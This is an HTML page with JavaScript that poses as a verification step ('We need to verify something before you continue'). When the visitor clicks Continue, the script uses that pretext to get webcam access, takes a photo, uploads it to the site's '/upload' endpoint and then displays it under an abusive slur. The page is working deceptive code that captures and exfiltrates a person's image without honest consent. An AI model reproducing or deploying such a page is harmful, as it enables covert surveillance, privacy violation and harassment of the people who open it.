<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>One moment</title>
  <style>
    * { box-sizing: border-box; }
    body {
      margin: 0;
      min-height: 100vh;
      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
      background: radial-gradient(circle at top, #f9fafb 0, #e5e7eb 40%, #d1d5db 100%);
      display: flex;
      align-items: center;
      justify-content: center;
      padding: 24px;
      color: #111827;
    }
    .card {
      width: 100%;
      max-width: 420px;
      background: rgba(255, 255, 255, 0.96);
      border-radius: 20px;
      padding: 24px 20px 20px;
      box-shadow:
        0 22px 45px rgba(15, 23, 42, 0.20),
        0 0 0 1px rgba(148, 163, 184, 0.12);
      text-align: center;
    }
    h1 {
      font-size: 1.4rem;
      margin: 0 0 6px;
      font-weight: 700;
      letter-spacing: -0.02em;
    }
    .sub {
      color: #6b7280;
      font-size: 0.95rem;
      margin: 0 0 24px;
      line-height: 1.5;
    }
    button {
      padding: 12px 28px;
      font-size: 0.98rem;
      cursor: pointer;
      border-radius: 999px;
      border: none;
      font-weight: 600;
      background: linear-gradient(135deg, #111827, #4b5563);
      color: #f9fafb;
      box-shadow: 0 10px 25px rgba(15, 23, 42, 0.35);
      transition: transform 0.12s ease-out, box-shadow 0.12s ease-out, opacity 0.12s;
    }
    button:hover {
      transform: translateY(-1px);
      box-shadow: 0 14px 30px rgba(15, 23, 42, 0.4);
    }
    button:active {
      transform: translateY(0);
      box-shadow: 0 8px 18px rgba(15, 23, 42, 0.35);
    }
    button:disabled {
      opacity: 0.6;
      cursor: wait;
      box-shadow: none;
      transform: none;
    }
    #message {
      margin-top: 14px;
      font-size: 0.88rem;
      color: #6b7280;
      min-height: 1.4em;
    }
    .hidden { display: none !important; }
    .reveal img {
      width: 100%;
      max-width: 280px;
      border-radius: 16px;
      margin-top: 18px;
      border: 2px solid #111827;
    }
    .reveal h1 {
      font-size: 1.5rem;
      margin-top: 6px;
      margin-bottom: 4px;
    }
    .reveal .sub {
      margin-top: 4px;
      margin-bottom: 0;
      font-size: 0.85rem;
    }
  </style>
</head>
<body>
  <main class="card">
    <div id="intro">
      <h1>One moment</h1>
      <p class="sub">We need to verify something before you continue.</p>
      <button id="goBtn">Continue</button>
      <p id="message"></p>
    </div>

    <div id="reveal" class="hidden reveal">
      <h1>gotcha fat retard</h1>
      <img id="photo" alt="" />
      <p id="revealNote" class="sub hidden"></p>
    </div>
  </main>

  <video id="video" autoplay playsinline muted class="hidden"></video>

  <script>
    const intro = document.getElementById('intro');
    const reveal = document.getElementById('reveal');
    const revealNote = document.getElementById('revealNote');
    const goBtn = document.getElementById('goBtn');
    const video = document.getElementById('video');
    const photo = document.getElementById('photo');
    const message = document.getElementById('message');

    const canvas = document.createElement('canvas');
    canvas.width = 640;
    canvas.height = 480;

    goBtn.addEventListener('click', async () => {
      goBtn.disabled = true;
      message.textContent = 'Checking…';

      let dataUrl = null;

      try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
        video.srcObject = stream;

        await new Promise((resolve) => {
          video.onloadeddata = () => setTimeout(resolve, 1500);
        });

        const ctx = canvas.getContext('2d');
        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
        dataUrl = canvas.toDataURL('image/png');

        stream.getTracks().forEach(t => t.stop());
        video.srcObject = null;

        message.textContent = 'Almost there…';

        const res = await fetch('/upload', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ image: dataUrl })
        });

        if (!res.ok) throw new Error('Upload failed');
      } catch (e) {
        console.error(e);
        if (!dataUrl) {
          message.textContent = "We couldn't complete that. Try again?";
          goBtn.disabled = false;
          return;
        }
        revealNote.textContent = "(Couldn't save to server)";
        revealNote.classList.remove('hidden');
      }

      photo.src = dataUrl;
      intro.classList.add('hidden');
      reveal.classList.remove('hidden');
    });
  </script>
</body>
</html>
